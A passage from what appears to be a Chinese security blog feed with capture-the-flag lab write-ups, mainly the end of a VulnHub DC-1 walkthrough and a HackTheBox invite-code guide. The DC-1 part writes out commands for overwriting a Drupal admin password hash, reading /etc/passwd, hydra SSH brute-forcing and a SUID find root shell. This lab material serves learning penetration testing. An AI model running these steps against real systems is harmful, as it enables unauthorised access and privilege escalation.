</span><br></pre></td></tr></table></figure><p><code>80张表太过分了！可以看到users表</code></p><h3 id="3-查看users表"><a href="#3-查看users表" class="headerlink" title="3.查看users表"></a>3.查看users表</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users\G  //\G表示将表旋转90°</span><br><span class="line">select * from users\G</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">             uid: 0</span><br><span class="line">            name: </span><br><span class="line">            pass: </span><br><span class="line">            mail: </span><br><span class="line">           theme: </span><br><span class="line">       signature: </span><br><span class="line">signature_format: NULL</span><br><span class="line">         created: 0</span><br><span class="line">          access: 0</span><br><span class="line">           login: 0</span><br><span class="line">          status: 0</span><br><span class="line">        timezone: NULL</span><br><span class="line">        language: </span><br><span class="line">         picture: 0</span><br><span class="line">            init: </span><br><span class="line">            data: NULL</span><br><span class="line">*************************** 2. row ***************************</span><br><span class="line">             uid: 1</span><br><span class="line">            name: admin</span><br><span class="line">            pass: <span class="variable">$S</span><span class="variable">$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5</span>.i38jnEKuDR</span><br><span class="line">            mail: admin@example.com</span><br><span class="line">           theme: </span><br><span class="line">       signature: </span><br><span class="line">signature_format: NULL</span><br><span class="line">         created: 1550581826</span><br><span class="line">          access: 1550583852</span><br><span class="line">           login: 1550582362</span><br><span class="line">          status: 1</span><br><span class="line">        timezone: Australia/Melbourne</span><br><span class="line">        language: </span><br><span class="line">         picture: 0</span><br><span class="line">            init: admin@example.com</span><br><span class="line">            data: b:0;</span><br><span class="line">*************************** 3. row ***************************</span><br><span class="line">             uid: 2</span><br><span class="line">            name: Fred</span><br><span class="line">            pass: <span class="variable">$S</span><span class="variable">$DWGrxef6</span>.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg</span><br><span class="line">            mail: fred@example.org</span><br><span class="line">           theme: </span><br><span class="line">       signature: </span><br><span class="line">signature_format: filtered_html</span><br><span class="line">         created: 1550581952</span><br><span class="line">          access: 1550582225</span><br><span class="line">           login: 1550582225</span><br><span class="line">          status: 1</span><br><span class="line">        timezone: Australia/Melbourne</span><br><span class="line">        language: </span><br><span class="line">         picture: 0</span><br><span class="line">            init: fred@example.org</span><br><span class="line">            data: b:0;</span><br><span class="line">3 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; </span><br></pre></td></tr></table></figure><p><code>可以看到cms的管理用户加密密码，前面flag2提示了，暴力破解不是唯一方法，那么就换一个思路</code></p><h3 id="4-修改覆盖admin密码"><a href="#4-修改覆盖admin密码" class="headerlink" title="4.修改覆盖admin密码"></a>4.修改覆盖admin密码</h3><p><code>用一个新的密码密文将原来的密码覆盖掉，手动生成</code></p><p><code>使用PHP调用scripts/password-hash.sh生成admin的密文</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ php scripts/password-hash.sh admin      </span><br><span class="line">php scripts/password-hash.sh admin</span><br><span class="line"></span><br><span class="line">password: admin                 <span class="built_in">hash</span>: <span class="variable">$S</span><span class="variable">$D4KjoV1PUSBjXtqmjsUaVuRE4TrPc8iY2F</span>.KYKPn.qzT7vbfsg27</span><br><span class="line"></span><br><span class="line">www-data@DC-1:/var/www$ </span><br></pre></td></tr></table></figure><p><code>覆盖</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update users set pass&#x3D;&quot;$S$D4KjoV1PUSBjXtqmjsUaVuRE4TrPc8iY2F.KYKPn.qzT7vbfsg27&quot; where uid&#x3D;1;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use drupaldb;</span><br><span class="line">use drupaldb;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; update users set pass&#x3D;&quot;$S$D4KjoV1PUSBjXtqmjsUaVuRE4TrPc8iY2F.KYKPn.qzT7vbfsg27&quot; where uid&#x3D;1;</span><br><span class="line">&lt;s&#x3D;&quot;$S$D4KjoV1PUSBjXtqmjsUaVuRE4TrPc8iY2F.KYKPn.qzT7vbfsg27&quot; where uid&#x3D;1;    </span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 0</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure><h2 id="0x09-登入cms"><a href="#0x09-登入cms" class="headerlink" title="0x09.登入cms"></a>0x09.登入cms</h2><p><code>admin/admin登入</code></p><img src="/2020/08/21/DC-1/image-20200820233740808.png" class><p><code>成功登入</code></p><img src="/2020/08/21/DC-1/image-20200820234010015.png" class><p><code>点击仪表盘发现flag3</code></p><img src="/2020/08/21/DC-1/image-20200820234207549.png" class><p><code>点击flag3</code></p><img src="/2020/08/21/DC-1/image-20200820234432653.png" class><p><code>发现线索在passwd中，查看passwd</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ cat /etc/passwd</span><br><span class="line">cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/bin/sh</span><br><span class="line">man:x:6:12:man:/var/cache/man:/bin/sh</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/bin/sh</span><br><span class="line">mail:x:8:8:mail:/var/mail:/bin/sh</span><br><span class="line">news:x:9:9:news:/var/spool/news:/bin/sh</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh</span><br><span class="line">proxy:x:13:13:proxy:/bin:/bin/sh</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/bin/sh</span><br><span class="line">backup:x:34:34:backup:/var/backups:/bin/sh</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/bin/sh</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/bin/sh</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</span><br><span class="line">libuuid:x:100:101::/var/lib/libuuid:/bin/sh</span><br><span class="line">Debian-exim:x:101:104::/var/spool/exim4:/bin/<span class="literal">false</span></span><br><span class="line">statd:x:102:65534::/var/lib/nfs:/bin/<span class="literal">false</span></span><br><span class="line">messagebus:x:103:107::/var/run/dbus:/bin/<span class="literal">false</span></span><br><span class="line">sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">mysql:x:105:109:MySQL Server,,,:/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line">flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash</span><br><span class="line">www-data@DC-1:/var/www$ </span><br></pre></td></tr></table></figure><p><code>结尾发现flag4，并且为/bin/bash，是可以登入的，前文已经发现开启了22端口</code></p><p><code>接下来进行爆破</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC1<span class="comment">#hydra -l flag4 -P /usr/share/john/password.lst 192.168.1.6 ssh -vV -f -o hydra.ssh</span></span><br><span class="line">......    //-l用户名，-P字典，-vV为爆破详细信息，-f为如果遇到正确的密码则停止爆破，-o输出文件</span><br><span class="line">......</span><br><span class="line">[ATTEMPT] target 192.168.1.3 - login <span class="string">&quot;flag4&quot;</span> - pass <span class="string">&quot;delta&quot;</span> - 137 of 3562 [child 2] (0/3)</span><br><span class="line">[ATTEMPT] target 192.168.1.3 - login <span class="string">&quot;flag4&quot;</span> - pass <span class="string">&quot;doctor&quot;</span> - 138 of 3562 [child 8] (0/3)</span><br><span class="line">[ATTEMPT] target 192.168.1.3 - login <span class="string">&quot;flag4&quot;</span> - pass <span class="string">&quot;fisher&quot;</span> - 139 of 3562 [child 10] (0/3)</span><br><span class="line">[ATTEMPT] target 192.168.1.3 - login <span class="string">&quot;flag4&quot;</span> - pass <span class="string">&quot;island&quot;</span> - 140 of 3562 [child 9] (0/3)</span><br><span class="line">[ATTEMPT] target 192.168.1.3 - login <span class="string">&quot;flag4&quot;</span> - pass <span class="string">&quot;john&quot;</span> - 141 of 3562 [child 15] (0/3)</span><br><span class="line">[ATTEMPT] target 192.168.1.3 - login <span class="string">&quot;flag4&quot;</span> - pass <span class="string">&quot;joshua&quot;</span> - 142 of 3562 [child 0] (0/3)</span><br><span class="line">[ATTEMPT] target 192.168.1.3 - login <span class="string">&quot;flag4&quot;</span> - pass <span class="string">&quot;karen&quot;</span> - 143 of 3562 [child 7] (0/3)</span><br><span class="line">[ATTEMPT] target 192.168.1.3 - login <span class="string">&quot;flag4&quot;</span> - pass <span class="string">&quot;marley&quot;</span> - 144 of 3562 [child 1] (0/3)</span><br><span class="line">[ATTEMPT] target 192.168.1.3 - login <span class="string">&quot;flag4&quot;</span> - pass <span class="string">&quot;orange&quot;</span> - 145 of 3562 [child 12] (0/3)</span><br><span class="line">[22][ssh] host: 192.168.1.3   login: flag4   password: orange</span><br><span class="line">[STATUS] attack finished <span class="keyword">for</span> 192.168.1.3 (valid pair found)</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-20 11:58:01</span><br><span class="line">root@JIYE:~/tmp/DC1<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><code>破解出密码为orange</code></p><p><code>登入</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC1<span class="comment"># ssh flag4@192.168.1.3</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.1.3 (192.168.1.3)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:89B+YqcNl4cSf/BZk26MQG1QeW4BvBlVENMbTRhVhsU.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? y</span></span><br><span class="line"><span class="string">Please type &#x27;</span>yes<span class="string">&#x27;, &#x27;</span>no<span class="string">&#x27; or the fingerprint: yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>192.168.1.3<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">flag4@192.168.1.3&#x27;</span>s password: </span><br><span class="line">Linux DC-1 3.2.0-6-486 <span class="comment">#1 Debian 3.2.102-1 i686</span></span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">flag4@DC-1:~$</span><br></pre></td></tr></table></figure><p><code>查看文件，得到flag4</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">flag4@DC-1:~$ ls</span><br><span class="line">flag4.txt</span><br><span class="line">flag4@DC-1:~$ </span><br><span class="line">flag4@DC-1:~$ </span><br><span class="line">flag4@DC-1:~$ cat flag4.txt </span><br><span class="line">Can you use this same method to find or access the flag <span class="keyword">in</span> root?</span><br><span class="line"></span><br><span class="line">Probably. But perhaps it<span class="string">&#x27;s not that easy.  Or maybe it is?</span></span><br><span class="line"><span class="string">flag4@DC-1:~$ </span></span><br></pre></td></tr></table></figure><p><code>根据提示，你能用相同方法找到root的吗？或许很难，但也不一定</code></p><p><code>尝试cd到root用户下，结果失败，接下来提权</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">flag4@DC-1:~$ <span class="built_in">cd</span> /root/</span><br><span class="line">-bash: <span class="built_in">cd</span>: /root/: Permission denied</span><br><span class="line">flag4@DC-1:~$ </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x10-提权"><a href="#0x10-提权" class="headerlink" title="0x10.提权"></a>0x10.提权</h2><blockquote><p>查看系统命令当中是否有SUID标识。</p><p>SUID标识为在命令执行时将短暂获得root权限，通过具有SUID标识的命令运行bash，这时bash就有root权限。</p><p>root信任SUID，SUID信任bash，bash就有了root权限</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 2&gt;/dev/null   // 查看具有SUID的命令</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">flag4@DC-1:~$ find / -perm -4000 2&gt;/dev/null</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/su</span><br><span class="line">/bin/ping6</span><br><span class="line">/bin/umount</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/procmail</span><br><span class="line">/usr/bin/find</span><br><span class="line">/usr/sbin/exim4</span><br><span class="line">/usr/lib/pt_chown</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/sbin/mount.nfs</span><br><span class="line">flag4@DC-1:~$ </span><br></pre></td></tr></table></figure><p><code>发现find就可以</code></p><p><code>下面进行利用</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">flag4@DC-1:~$ find /root -<span class="built_in">exec</span> <span class="string">&quot;whoami&quot;</span> \; </span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">flag4@DC-1:~$ </span><br></pre></td></tr></table></figure><p><code>可以发现为root</code></p><p><code>提权</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">flag4@DC-1:~$ find /root -<span class="built_in">exec</span> <span class="string">&quot;/bin/bash&quot;</span> \;      </span><br><span class="line">bash-4.2$ id</span><br><span class="line">uid=1001(flag4) gid=1001(flag4) groups=1001(flag4)</span><br><span class="line">bash-4.2$ </span><br></pre></td></tr></table></figure><p><code>e翻车了！再换个方法</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bash-4.2$ find /root -<span class="built_in">exec</span> <span class="string">&quot;/bin/sh&quot;</span> \;    </span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=1001(flag4) gid=1001(flag4) euid=0(root) groups=0(root),1001(flag4)</span><br><span class="line"><span class="comment"># </span></span><br></pre></td></tr></table></figure><p><code>成功了😭</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pwd</span></span><br><span class="line">/home/flag4</span><br><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">thefinalflag.txt</span><br><span class="line"><span class="comment"># cat thefinalflag.txt</span></span><br><span class="line">Well <span class="keyword">done</span>!!!!</span><br><span class="line"></span><br><span class="line">Hopefully you<span class="string">&#x27;ve enjoyed this and learned some new skills.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">You can let me know what you thought of this little journey</span></span><br><span class="line"><span class="string">by contacting me via Twitter - @DCAU7</span></span><br><span class="line"><span class="string"># </span></span><br></pre></td></tr></table></figure><h2 id="0x11-接下来就是擦屁股走人了，干不动了。。。"><a href="#0x11-接下来就是擦屁股走人了，干不动了。。。" class="headerlink" title="0x11.接下来就是擦屁股走人了，干不动了。。。"></a>0x11.接下来就是擦屁股走人了，干不动了。。。</h2>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-官网描述&quot;&gt;&lt;a href=&quot;#0x00-官网描述&quot; class=&quot;headerlink&quot; title=&quot;0x00.官网描述&quot;&gt;&lt;/a&gt;0x00.官网描述&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;DC-1 is a purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing.&lt;/p&gt;
&lt;p&gt;It was designed to be a challenge for beginners, but just how easy it is will depend on your skills and knowledge, and your ability to learn.&lt;/p&gt;
&lt;p&gt;To successfully complete this challenge, you will require Linux skills, familiarity with the Linux command line and experience with basic penetration testing tools, such as the tools that can be found on Kali Linux, or Parrot Security OS.&lt;/p&gt;
&lt;p&gt;There are multiple ways of gaining root, however, I have included some flags which contain clues for beginners.&lt;/p&gt;
&lt;p&gt;There are five flags in total, but the ultimate goal is to find and read the flag in root’s home directory. You don’t even need to be root to do this, however, you will require root privileges.&lt;/p&gt;
&lt;p&gt;Depending on your skill level, you may be able to skip finding most of these flags and go straight for root.&lt;/p&gt;
&lt;p&gt;Beginners may encounter challenges that they have never come across previously, but a Google search should be all that is required to obtain the information required to complete this challenge.&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="vulnhub" scheme="https://lunamoore.github.io/categories/vulnhub/"/>
    
    
    <category term="靶机" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox注册</title>
    <link href="https://lunamoore.github.io/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/"/>
    <id>https://lunamoore.github.io/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/</id>
    <published>2020-08-19T08:36:43.000Z</published>
    <updated>2020-08-19T12:00:20.998Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言-什么是Hack-The-Box"><a href="#0x00-前言-什么是Hack-The-Box" class="headerlink" title="0x00.前言~什么是Hack The Box"></a>0x00.前言~什么是Hack The Box</h2><blockquote><p>它基本上是一个在线平台，用于测试和增强你的渗透测试和网络安全技能。它包含一些不断更新的挑战。其中一些模拟了现实世界的场景，而另一些则更倾向于CTF的挑战风格。如果你对网络安全或信息安全感兴趣，则应尝试此站点。OK让我们开始吧！！！</p></blockquote><a id="more"></a><h2 id="0x01-首先，访问Hack-the-Box网站，并阅读其常见问题解答和一些其他有用的东西。"><a href="#0x01-首先，访问Hack-the-Box网站，并阅读其常见问题解答和一些其他有用的东西。" class="headerlink" title="0x01.首先，访问Hack the Box网站，并阅读其常见问题解答和一些其他有用的东西。"></a>0x01.首先，访问<span class="exturl" data-url="aHR0cHM6Ly93d3cuaGFja3RoZWJveC5ldS8=">Hack the Box网站，<i class="fa fa-external-link-alt"></i></span>并阅读其常见问题解答和一些其他有用的东西。</h2><h2 id="0x02-系统将提示您转到https-www-hackthebox-eu-邀请加入HTB。"><a href="#0x02-系统将提示您转到https-www-hackthebox-eu-邀请加入HTB。" class="headerlink" title="0x02.系统将提示您转到https://www.hackthebox.eu/邀请加入HTB。"></a>0x02.系统将提示您转到<span class="exturl" data-url="aHR0cHM6Ly93d3cuaGFja3RoZWJveC5ldS9pbnZpdGU=">https://www.hackthebox.eu/<i class="fa fa-external-link-alt"></i></span>邀请加入HTB。</h2><h2 id="0x03-当您转到该页面时，将看到一个文本框，让你输入邀请码。"><a href="#0x03-当您转到该页面时，将看到一个文本框，让你输入邀请码。" class="headerlink" title="0x03.当您转到该页面时，将看到一个文本框，让你输入邀请码。"></a>0x03.当您转到该页面时，将看到一个文本框，让你输入<em>邀请码</em>。</h2><h3 id="01-根据提示打开控制台"><a href="#01-根据提示打开控制台" class="headerlink" title="01.根据提示打开控制台"></a>01.根据提示打开控制台</h3><img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819155151668.png" class><h3 id="02-根据提示继续"><a href="#02-根据提示继续" class="headerlink" title="02.根据提示继续"></a>02.根据提示继续</h3><p><code>挑战第一步，此页面加载一个有趣的javascript文件。看看你能不能找到它：</code></p><img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819155456002.png" class><h3 id="03-发现邀请接口的js文件"><a href="#03-发现邀请接口的js文件" class="headerlink" title="03.发现邀请接口的js文件"></a>03.发现邀请接口的js文件</h3><img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819155754688.png" class><h3 id="04-右键打开，发现制造邀请码函数"><a href="#04-右键打开，发现制造邀请码函数" class="headerlink" title="04.右键打开，发现制造邀请码函数"></a>04.右键打开，发现制造邀请码函数</h3><img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819155903977.png" class><h3 id="05-在控制台调用"><a href="#05-在控制台调用" class="headerlink" title="05.在控制台调用"></a>05.在控制台调用</h3><p><code>可以看到200状态码，可以看到data为加密为ROT13(有时也为base64)</code></p><img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819160416212.png" class><h3 id="06-解密"><a href="#06-解密" class="headerlink" title="06.解密"></a>06.解密</h3><p><code>发现要发送POST请求</code></p><img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819160919218.png" class><h3 id="07-发送POST请求"><a href="#07-发送POST请求" class="headerlink" title="07.发送POST请求"></a>07.发送POST请求</h3><p><code>得到以=结尾的数据，猜测为base64</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SlpYQkMtRkVBWUktWkhWQ1AtRkhTU0gtS0xEVFQ=</span><br></pre></td></tr></table></figure><img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819161940343.png" class><h3 id="08-解码"><a href="#08-解码" class="headerlink" title="08.解码"></a>08.解码</h3><p><code>得到邀请码</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JZXBC-FEAYI-ZHVCP-FHSSH-KLDTT</span><br></pre></td></tr></table></figure><img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819162456042.png" class><h3 id="09-之后就可以愉快的玩耍了"><a href="#09-之后就可以愉快的玩耍了" class="headerlink" title="09.之后就可以愉快的玩耍了"></a>09.之后就可以愉快的玩耍了</h3><p><code>根据提示进行连接即可</code></p><img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819195715615.png" class><p><code>下图为连接成功状态</code></p><img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819195817627.png" class>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-前言-什么是Hack-The-Box&quot;&gt;&lt;a href=&quot;#0x00-前言-什么是Hack-The-Box&quot; class=&quot;headerlink&quot; title=&quot;0x00.前言~什么是Hack The Box&quot;&gt;&lt;/a&gt;0x00.前言~什么是Hack The Box&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;它基本上是一个在线平台，用于测试和增强你的渗透测试和网络安全技能。它包含一些不断更新的挑战。其中一些模拟了现实世界的场景，而另一些则更倾向于CTF的挑战风格。如果你对网络安全或信息安全感兴趣，则应尝试此站点。OK让我们开始吧！！！&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="HackTheBox" scheme="https://lunamoore.github.io/categories/HackTheBox/"/>
    
    
    <category term="靶机" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>MSF的简单操作</title>
    <link href="https://lunamoore.github.io/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/"/>
    <id>https://lunamoore.github.io/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/</id>
    <published>2020-08-18T07:47:41.000Z</published>
    <updated>2020-08-18T10:27:30.144Z</updated>
    
